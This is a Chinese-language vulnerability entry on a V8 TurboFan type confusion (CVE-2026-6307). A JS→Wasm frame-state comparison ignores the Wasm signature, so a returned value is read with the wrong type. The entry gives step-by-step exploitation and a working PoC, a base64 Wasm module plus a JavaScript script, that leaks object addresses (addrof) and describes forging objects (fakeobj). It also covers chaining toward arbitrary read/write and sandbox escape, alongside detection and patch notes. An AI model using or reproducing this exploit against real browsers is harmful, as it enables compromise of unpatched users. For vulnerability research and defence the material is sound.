---
id: binary-pwn-browser-v8-wasm-frame-state-type-confusion
title: V8 TurboFan JS→Wasm 延续帧签名漏比较导致类型混淆
type: scenario
domain: binary
path: binary/pwn/browser
technique: jit-frame-state-type-confusion
aliases:
- CVE-2026-6307
- V8 类型混淆
- Wasm 返回类型错乱
- addrof/fakeobj
- TurboFan 帧状态合并
tags:
- v8
- turbofan
- wasm
- jit
- type-confusion
- browser
- addrof
- fakeobj
- deoptimization
cve:
- CVE-2026-6307
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: Chrome 106 起，至 147.0.7727.101 之前（Windows/macOS/Linux/Android）；V8 14.7.173.16 及之前命中，14.7.173.19 修复
verification:
  verified_by: verifier-C
  verified_at: '2026-11-04T19:14:21+08:00'
  notes: 已修复 TDZ 并复核
---

## 一句话结论

TurboFan 在 CSE/GVN 合并帧状态时漏比较派生类 `JSToWasmFrameStateFunctionInfo` 的 `signature_` 字段，把返回类型不同的两条 JS→Wasm 调用点判成同一份；惰性反优化随后按错误签名解释返回寄存器，使 `externref` 对象指针与 `i64` 整数位模式互相转换，可在 V8 堆沙箱内完成 addrof / fakeobj。

## 原理

1.  `foo(o){return o.x;}` 的属性读取若命中两条原型 getter，而 getter 分别指向两个 Wasm 导出函数，TurboFan 内联后同一 JS 函数里会留下两条 JS→Wasm 调用点。两条导出函数的参数签名可以相同，仅返回类型不同（`() -> externref` 与 `() -> i64`）。
2.  每个调用点各建一份 `JSToWasmFrameStateFunctionInfo` 帧状态。真正的区分信息是派生类里的 `signature_` 指针；基类只保存类型、liftoff 帧大小、wasm 函数索引、参数个数、最大参数个数、局部变量个数、`shared_info`、`bytecode_array`。
3.  `FrameStateFunctionInfo::operator==` 逐项比较上述基类字段和两个 wasm 字段，但没有比较派生类的 `signature_`。两份只差返回签名的帧状态因此判等；`operator==(FrameStateInfo&)` 转调它后也判等，哈希值同样一致。
4.  CSE/GVN 把第二份帧状态当作第一份的重复节点复用，第二份签名连同其返回类型被丢弃，只保留先登记的那一份签名。`FrameStateInfo` 的判等是编译器判断“两个中间状态是否同一份”的依据，漏掉派生字段破坏了等价关系的真实性，这是漏洞成立的根本原因。
5.  指令选择阶段，`kJSToWasmBuiltinContinuation` 分支从存活帧状态的 `function_info()->signature()` 取签名，构造 `JSToWasmFrameStateDescriptor`，并按 `WasmReturnTypeFromSignature` 折算成 `return_kind_`（`kRef` 或 `kI64`）。被归并的那条调用点此时拿到的是另一条 Wasm 函数的签名。
6.  惰性反优化发生在 Wasm 调用返回之后时，反优化器读取 `return_kind_`，对同一个物理寄存器 `kReturnRegister0` 做两种解释：`kI64` 走 `NewInt64ToBigInt`，把位模式当无标记 64 位整数包成 BigInt；`kRef` 走 `NewTagged`，把同一位模式当带标记对象指针。位模式不变，解释方式改变，类型混淆成立。
7.  物化阶段把结果写入延续帧返回槽：对象引用的带标记指针被包成 BigInt 即泄漏堆地址（addrof），整数位模式被当成 `Tagged` 即得到伪造对象引用（fakeobj）。

## 触发条件

- 受影响版本：Chrome 106 起至 147.0.7727.101 之前（含 Windows/macOS/Linux/Android），对应 V8 14.7.173.16 及之前；14.7.173.19 修复。Chromium 系浏览器与内嵌 V8 的运行时（Node.js、Electron、Deno 等）按各自 V8 版本判断。
- 一个 JS 函数内联两条参数相同、返回类型不同的 JS→Wasm 调用点（`externref` 与 `i64`）。
- 惰性反优化必须发生在 Wasm 调用返回之后；若在调用前反优化，延续帧不会建立，走不到错误物化分支。
- 触发反优化的常见手段：Wasm 内回调在调用期间修改原型，使依赖旧 map 的优化代码被标记为需要反优化。
- PoC 为稳定触发使用 `--allow-natives-syntax` 控制优化时机、`--no-maglev` 让函数直接进入 TurboFan；真实利用可由攻击者用正常调用热度驱动优化，不依赖这两个开关。

## 利用步骤

1.  准备一个 Wasm 模块：导入 `env.callback`，导出 `g_ref`（externref 全局）、`g_i64`（i64 全局）、`return_ref`（`() -> externref`）、`return_i64`（`() -> i64`）；两个函数体都是“调回调，再取全局并返回”。模块无需内存段、表或数据段。
2.  实例化后把 `return_i64` 与 `return_ref` 分别装到两个原型的同名 getter 上，目标函数写成 `foo(o){return o.x;}`。
3.  用两个不同原型的对象交替调用 `foo` 预热，让内联器同时看到两条 Wasm 调用点并触发帧状态合并。
4.  优化 `foo` 并执行一次，确认 TurboFan 代码生成、帧状态已归并。
5.  置位反优化开关：让回调在 Wasm 调用期间修改其中一个原型，使旧 map 失效；随后用另一类接收者调用 `foo`，反优化落在 Wasm 调用返回之后。
6.  读取返回值类型：`externref` 返回槽被按 `i64` 物化时，哨兵对象变成 BigInt，其数值即带标记指针（bit0 置位），得到 addrof。
7.  反向利用：把训练顺序倒过来（先 externref 后 i64），让存活签名变成 `externref`，再把泄漏到的地址写进 `g_i64`，第二次反优化会把整数位模式还原为对象引用，得到 fakeobj。
8.  两个方向放在同一页面、两个独立实例中接力，因为堆地址受 ASLR 影响，仅在本进程内有效。

## PoC

最小 120 字节 Wasm 模块（base64，无内存/表/数据段），两个函数只差返回类型：

```text
AGFzbQEAAAABDANgAABgAAFvYAABfgIQAQNlbnYIY2FsbGJhY2sAAAMDAgECBgsCbwHQbwt+AUIACwcrBAVnX3JlZgMABWdfaTY0AwEKcmV0dXJuX3JlZgABCnJldHVybl9pNjQAAgoPAgYAEAAjAAsGABAAIwEL
```

单方向验证（Chrome headless，`--js-flags="--allow-natives-syntax --no-maglev"`）：

```js
const bytes = Uint8Array.from(atob(B64), c => c.charCodeAt(0));
let arm = false;
const cb = () => { if (arm) ProtoRef.prototype.m = 1; }; // 调用期间改原型 -> 旧 map 失效
const e = new WebAssembly.Instance(new WebAssembly.Module(bytes), { env: { callback: cb } }).exports;
function ProtoI64() {} function ProtoRef() {}
Object.defineProperty(ProtoI64.prototype, 'x', { get: e.return_i64 });
Object.defineProperty(ProtoRef.prototype, 'x', { get: e.return_ref });
const ref = new ProtoRef(), i64 = new ProtoI64(), sentinel = { tag: 'sentinel' };
e.g_ref.value = sentinel; e.g_i64.value = 42n;
function foo(o) { return o.x; }
%PrepareFunctionForOptimization(foo);
for (let i = 0; i < 20; i++) { foo(i64); foo(ref); } // 交替预热，内联两条调用点
%OptimizeFunctionOnNextCall(foo);
foo(i64);                    // 生成 TurboFan 代码，帧状态按先出现的 i64 签名归并
arm = true;
const r = foo(ref);          // 调用返回后惰性反优化：externref 槽按 i64 物化
console.log(typeof r === 'bigint' ? 'ADDROF 0x' + r.toString(16) : 'no confusion');
```

预期：`foo(ref)` 原本返回 `{tag:'sentinel'}`，命中时返回 BigInt，其十六进制末位为 `d` 或 `1`（带标记指针 bit0 置位），数值即哨兵对象在本进程中的地址。反向训练顺序可把 `g_i64` 中的整数位模式还原成对象引用。

## 变体与关联

- 方向反转：先以 `i64` 接收者预热得到 addrof，先以 `externref` 接收者预热得到 fakeobj；两个实例隔离后可在一页内接力。
- 同根因模式：编译器中间状态判等函数漏掉派生类字段、CSE/GVN 误合并、经基类引用拷贝导致派生字段被切片（slicing）。审计 JIT/编译器时重点检查 `operator==`/哈希是否覆盖派生类全部身份字段。
- 关联利用：addrof/fakeobj 是浏览器渲染进程内利用链的常备原语，后续可接任意读写、Wasm 实例伪造或堆沙箱逃逸；堆沙箱本身是否需要再逃逸取决于目标版本与进程隔离配置。
- 上游回归用例以 d8 + `WasmModuleBuilder` 构造同样场景，与手写 120 字节模块机制一致。

## 检测与防御

- 检测思路：构造“同一 JS 函数内联两个返回类型不同的 Wasm 调用点，Wasm 返回后触发惰性反优化”的测试页，检查返回值的 JS 类型是否变化（BigInt 与对象互换）。注意修复前后都会走到反优化路径，不能用“是否发生反优化”作为判据，只能看返回值类型。
- 版本检测：Chrome < 147.0.7727.101 / V8 <= 14.7.173.16 视为受影响；内嵌 V8 的 Node.js、Electron、Deno 需单独核对宿主内嵌版本，不能只看 Chrome 是否升级。
- 防御：升级到 Chrome 147.0.7727.101（V8 14.7.173.19）或更高；开启站点隔离与 V8 堆沙箱，限制渲染进程被攻陷后的能力；对高价值环境缩短浏览器大版本滞后窗口。
- 补丁要点：在 `FrameStateFunctionInfo::operator==` 中对 `kJSToWasmBuiltinContinuation` 两侧下转型比较 `signature()`；用 `static_assert` 约束派生类尺寸，防止新增字段再次漏比；删除基类拷贝构造/赋值，避免经基类引用拷贝时派生字段被切片。
